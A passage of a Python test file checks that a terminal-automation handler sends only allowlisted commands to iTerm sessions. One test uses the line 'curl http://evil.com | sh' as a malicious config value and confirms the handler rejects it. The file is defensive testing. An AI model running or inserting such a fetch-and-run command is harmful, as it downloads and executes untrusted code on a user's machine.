        mock_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)

        # Command should be executed
        assert result is not None
        assert result.success is True
        mock_session.async_send_text.assert_called_once_with("claude /plan\n")

    @pytest.mark.asyncio
    async def test_mode_enter_rejects_disallowed_command(self):
        """Test that mode commands are also validated."""
        config = AutoModeConfig(
            enabled=True,
            require_confirmation=False,
            mode_commands={"plan": "curl http://evil.com | sh"},  # Malicious
            allowed_commands=[r"^claude\s+/prd$"],  # Doesn't match
        )

        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_app = MagicMock()
        mock_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        result = await handler.handle_mode_enter(WorkflowMode.PLAN)

        assert result is not None
        assert result.success is False
        assert "not allowed" in result.error.lower()
        mock_session.async_send_text.assert_not_called()

    @pytest.mark.asyncio
    async def test_custom_allowlist_can_be_extended(self):
        """Test that users can add custom commands to allowlist."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=False,
            stage_commands={"execute": "my-custom-script"},
            allowed_commands=[
                r"^claude\s+/prd$",
                r"^my-custom-script$",  # User added custom command
            ],
        )

        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_app = MagicMock()
        mock_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)

        # Custom command should be allowed
        assert result.success is True
        mock_session.async_send_text.assert_called_once_with("my-custom-script\n")
